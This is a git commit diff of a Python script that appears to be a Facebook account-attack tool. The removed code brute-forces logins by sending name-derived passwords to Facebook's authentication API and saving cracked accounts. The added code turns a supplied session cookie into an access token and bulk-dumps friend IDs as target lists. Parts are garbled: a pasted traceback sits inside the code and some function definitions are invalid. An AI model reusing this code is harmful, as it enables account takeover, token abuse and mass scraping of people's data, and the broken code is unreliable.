ec3a877216bd2b13957a711629b18d4082d6b91f
PakistanKarachi <125345002+PakistanKarachi@users.noreply.github.com>
2023-02-24 00:40:13 +0400

    Karachi.py
    git clone https://github.com/PakistanKarachi/PAKISTAN.git

--- Karachi.py
+++ Karachi.py
@@ -1,253 +1,166 @@
-#!/usr/bin/python3
-#Written by Mr Bilo
-import requests,bs4,json,os,sys,random,datetime,time,re
+import requests,random,sys,json,os,re,datetime,socket,pprint
+from time import sleep as slp
+from os import system as cmd
+import os
+totaldmp = 0
+count = 0
 try:
-	import rich
-except ImportError:
-	os.system('pip install rich')
-	time.sleep(1)
+	os.mkdir('Data')
+except:
+	pass
+try:
+	os.remove('temp.txt')
+except:
+	pass
+head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
+logo = """____________ MR JADUGAR____________
+_____________________________________
+github   : not found                                
+Facebook : Kashif Baloch                     
+YouTube  : Mr Jadugar Gamers           
+Whatsapp : not found                            
+                                                 [DEAD USER]
+_____________________________________ """
+def Jadu():
+	os.system("clear")
+	os.system("xdg-open https://youtube.com/channel/UCrfVEu_7ylJI8XiVBrg4gmw")
+	print(logo)
+    
+	print("its only for fun")
+	print("_____________________________________")
+	print(" [1] login with cookies")
+	p = input(" Select An Option : ")
+	if p in ['1','01']:
+			main()
+
+def login():
+	os.system("clear")
+	print(logo)
+	now = datetime.datetime.now()
+	print("Date and Time ")
+	print(now.strftime("%y-%m-%d %H:%M:%S"))
+	hostnm = socket.gethostname()
+	ipaddress = socket.gethostbyname(hostnm)
+	print("ip address is :", ipaddress)
+	print("country : Pakistan")
+	print("_____________________________________")
 	try:
-		import rich
-	except ImportError:
-		exit('[✓] Internet Eror ,Install Manual (pip install rich)')
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as parser
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-try:ugen = open('user.txt','r').read().splitlines()
-except:ugen = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz
-try:ugen2 = open('user2.txt','r').read().splitlines()
-except:ugen2 = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz
-
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
-
-x = '\033[93m'
-k = '\033[93m'
-h = '\x1b[1;92m'
-hh = '\033[92m'
-u = '\033[95m'
-kk = '\033[93m'
-b = '\33[1;96m'
-p = '\x1b[1;95m'
-P = '\033[0;00m'
-J = '\033[1;93m'
-S = '\033[0;00m'
-N = '\x1b[0m'
-I ='\033[1;92m'
-C ='\033[1;96m'
-M ='\033[1;91m'
-U ='\033[1;95m'
-K ='\033[1;93m'
-P='\033[00m'
-h='\033[1;90m'
-Q="\033[00m"
-kk='\033[1;92m'
-ff='\033[1;96m'
-G='\033[1;96m'
-p='\033[00m'
-h='\033[1;90m'
-Q="\033[00m"
-I='\033[1;92m'
-II='\033[1;96m'
-m='\033[1;91m'
-O ='\033[1;93m'
-H='\033[1;93m'
-b = '\033[1;96m'
-war = "[•]"
-B = random.choice([U,I,K,b,M])
-
-dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
-dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-
-my_id = '100007061760822'
-
-def jalan(z):
-    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
-def mlaku(z):
-    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
-def clear('/data/data/com.termux/files/home/PAKISTAN/Karachi.py'):
-	os.system('/data/data/com.termux/files/home/PAKISTAN/Karachi.py')
-def back('/data/data/com.termux/files/home/PAKISTAN/Karachi.py'):
-	menu('/data/data/com.termux/files/home/PAKISTAN/Karachi.py')
-def banner('/data/data/com.termux/files/home/PAKISTAN/Karachi.py'):
-	clear()
-	print("""
-\033[1;91m █████╗ ██████╗ ██╗  ██╗    
-\033[1;92m██╔══██╗██╔══██╗██║ ██╔╝    
-\033[1;93m███████║██████╔╝█████╔╝     
-\033[1;95m██╔══██║██╔═══╝ ██╔═██╗     
-\033[0;00m██║  ██║██║     ██║  ██╗    
-\033[1;96m╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝                                
-\x1b[92;1m===================================>\x1b[92;1m
-\x1b[93;1m Authur       \x1b[92;1m=>         \x1b[93;1m SANA ULLAH
-\x1b[93;1m Whatsp       \x1b[92;1m=>        \x1b[93;1m+971564382087
-\x1b[93;1m TEAM       \x1b[92;1m=>          \x1b[93;1mARAIN
-\x1b[92;1m===================================>\x1b[92;1m
-"""%(h))
-		
-def menu(): #AYAN-ARAIN
-	banner(Traceback (most recent call last):
-  File "/data/data/com.termux/files/home/PAKISTAN/Karachi.py", line 245, in <module>
-    menu()
-  File "/data/data/com.termux/files/home/PAKISTAN/Karachi.py", line 100, in menu
-    banner()
-  File "/data/data/com.termux/files/home/PAKISTAN/Karachi.py", line 85, in banner
-    print("""
-          ^^^
-    TypeError: not all arguments converted during string formatting                                                       ~/PAKISTAN $)
-	print("") #AYAN-ARAIN
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	print("""%s \33[1;33m[1] File Crack  """%(h))
-	print("""%s \33[1;33m[0] Exit"""%(h))
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	farhan = input(x+'\33[1;96m•Input Number> ')
-	if farhan in ['1','01']:
-		File2()
-	elif farhan in ['0','00']:
-		os.system("https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN")
-		exit()
-	else:
-		os.system("https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN")
-		exit()
-
-def File2():
-			clear()
-			banner()
-			try:
-				fileX = input ('\n [+] Enter file path : ') 
-				for line in open(fileX, 'r').readlines():
-					id.append(line.strip())
-				setting()
-			except IOError:
-				exit("\n [!] file %s not found"%(fileX))
-
-def setting():
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	print("""%s \33[1;33m[01] Farward Cracking """%(h))
-	print("""%s \33[1;33m[02] Reverse Cracking """%(h))
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	mubashar = input(x+'\33[1;96m•Input Number>')
-	if mubashar in ['1','01']:
-		for bacot in id:
-			id2.append(bacot)
-	elif mubashar in ['2','02']:
-		for bacot in id:
-			id2.insert(0,bacot)
-	
-	else:
-		print("""%s \33[1;33mRoung Input"""%(h))
-		exit()
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	print("""%s \33[1;33m[01] B-Api (fast)"""%(h))
-	print("""%s \x1b[92;1m<===================================>\x1b[92;1m """%(h))
-	baloch = input(x+'\33[1;96m•Input Number> : ')
-	if baloch in ['1','01']:
-		method.append('api')
-	else:
-		method.append('api')
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	fast = input(x+'\33[1;96m Want To Start ? (y/t) : ')
-	if fast in ['y','Y']:
-		passwrd()
-	elif fast in ['t','T']:
-		os.system("https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN")
-		exit()
-
-def passwrd():
-	clear()
-	banner()
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	print(x+' '+h+' '+x+' Total ids : '+str(len(id)))
-	print(x+'   [  IF NO RESULT USE AIRPLANE MODE  ]\n   Cracking Starting...')
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(nmf)
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-			if 'api' in method:
-				pool.submit(crack2,idf,pwv)
-			else:
-				pool.submit(crack2,idf,pwv)
-	print('')
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	exitss = input(x+'\33[1;96m Want to Exit (y/t) : ')
-	if exitss in ['y','Y']:
-		exit()
-	else:
-		exit()
-
-def crack2(idf,pwv):
-	global loop,ok,cp
-	bi = random.choice([u,k,kk,b,h,hh])
-	pers = loop*100/len(id2)
-	fff = '%'
-	print('\r%s [Bilo] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
-	ua = random.choice(ugen).replace('\n','')
-	ses = requests.Session()
-	for pw in pwv:
+		fbcokis= input('[>>] Input Your Facebook Cookie : ')
+		print(47*"\033[1;37;1m-")
+		head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
+		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
+		eaag = re.search("(EAAG\w+)",str(ftoken))
+		open("data/token.txt", "w").write(eaag.group(1))
+		open("data/cookie.txt", "w").write(fbcokis)
+		token = open('data/token.txt','r').read()
+		main()
+	except Exception as e:
+		os.system("rm -f data/token.txt")
+		print(f"[*] Error {e}")
+		slp(2)
+		login()
+def grep(f):
+	o = input('\033[0;97m[->] Save As : \033[1;32;1m')
+	print(47*"\033[1;37;1m-")
+	try:
+		ask_link = int(input('[>>] Enter Grip ID Limit : \033[1;32;1m'))
+		print(47*"\033[1;37;1m-")
+	except:
+		ask_link = 1
+		completed = 0
+	for links in range(ask_link):
+		li = input('[✓] Separate Object : \033[1;32;1m')
+		os.system('cat '+f+' | grep "'+li+'" >> '+o)
+	print(47*"\033[1;37;1m-")
+	print("[>>] Separating Successful ")
+	print("[>>] New File Save \033[1;32;1m" + o)
+	print(47*"\033[1;37;1m-")
+	input("[>>] Press Inter to go Back < ")
+	main()
+def main():
+	fbidz = []
+	os.system("clear")
+	print(logo)
+	try:
+		fbcokis = open("data/cookie.txt", "r").read()
+		token = open('data/token.txt','r').read()
+		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
+		eaag = re.search("(EAAG\w+)",str(ftoken))
+	except:
+		slp(1)
+		login()
+	global totaldmp,count
+	try:
+		token=open('data/token.txt','r').read()
+		fbcokis = open("data/cookie.txt", "r").read()
+	except FileNotFoundError:
+		print("[*] Login Not Found")
+		slp(1)
+		cmd('rm -rf data/token.txt')
+		login()
+	try:
+		cmd('clear')
+		os.system("clear")
+		print(logo)
+		now = datetime.datetime.now()
+		print("Date and Time ")
+		print(now.strftime("%y-%m-%d %H:%M:%S"))
+		hostnm = socket.gethostname()
+		ipaddress = socket.gethostbyname(hostnm)
+		print("ip address is :", ipaddress)
+		print("_____________________________________")
 		try:
-			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
-			if "www.facebook.com" in resp.json()["error_msg"]:
-				if 'ya' in oprek:
-					akun.append(idf+'|'+pw)
-					ceker(idf,pw)
-				else:
-					print('\r%s [AYAN-CP] %s|%s        '%(b,idf,pw))
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-					akun.append(idf+'|'+pw)
-					cp+=1
-				break
-			elif "session_key" in resp.text and "EAAB" in resp.text:
-				print('\r%s [AYAN-ok] %s|%s        '%(h,idf,pw))
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				ok+=1
-				break
+			print("cookies already login")
+			fbbuid = input("[->] Enter Public ID Link : ")
+			dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
+			for idnm in dmp['friends']['data']:
+				totaldmp+=1
+				fbidz.append(idnm['id'])
+		except KeyError:
+			print("[*] Public ID Not Found")
+			main()
+		filepath = input("[>>] Enter File Path : ")
+		print("")
+		print(47*"\033[1;37;1m-")
+		apnd = open(filepath,'w')
+		for fbuid in fbidz:
+			count += 1
+			try:
+				dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
+				for idnm in dmp['friends']['data']:
+					apnd.write(idnm['id']+"|"+idnm['name']+'\n')
+				print("\x1b[1;92m[>>] Dumping UID From : " + fbuid)
+			except KeyError:
+				print('\x1b[1;91m[>>] Dumping UID From : ' + fbuid)
+		apnd.close()
+		print(47*"\033[1;37;1m-")
+		ch_x1 = input("[->] DoYou Want to Use DuplicateID Cuter (n/y) : ")
+		if ch_x1 in ["yes","Yes","YES","Y","y"]:
+			newfile = input("[->] File Without Duplicate ID Save As : ")
+			os.system('sort -r '+filepath+' | uniq > '+newfile)
+			ch_x2 = input("[->] DoYou Want to Use ID Separator (n/y) : ")
+			if ch_x2 in ["yes","Yes","YES","Y","y"]:
+				grep(newfile)
 			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-
-def jalan(z):
-    for e in z + "\n":
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.04)
-def mlaku(z):
-    for e in z + "\n":
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.03)
-
-
-if __name__=='__main__':
-	os.system('git pull')
-	try:os.mkdir('CP')
-	except:pass
-	try:os.mkdir('OK')
-	except:pass
-	os.system("https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN")
-	menu()
-	
+				print(47*"-")
+				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {newfile} \x1b[0;37m")
+				print(47*'-')
+				input("[>>] Press Inter to go Back < ")
+				menu()
+		else:
+			print('\n')
+			ch_x2 = input("[->] Do You Want to Use ID Separator (n/y) : \033[1;32;1m")
+			if ch_x2 in ["yes","Yes","YES","Y","y"]:
+				grep(filepath)
+			else:
+				print(47*'\033[1;37;1m-')
+				print (f"\x1b[0;37m Total ID Dump :\x1b[1;92m {totaldmp}")
+				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {filepath} ")
+				print(47*'\033[1;37;1m-')
+				input("[>>] Press Inter to go Back < ")
+				menu()
+	except Exception as e:
+		print("[>>] Error : %s"%e)
+		exit("")
+if __name__ == '__main__':
+	Jadu()
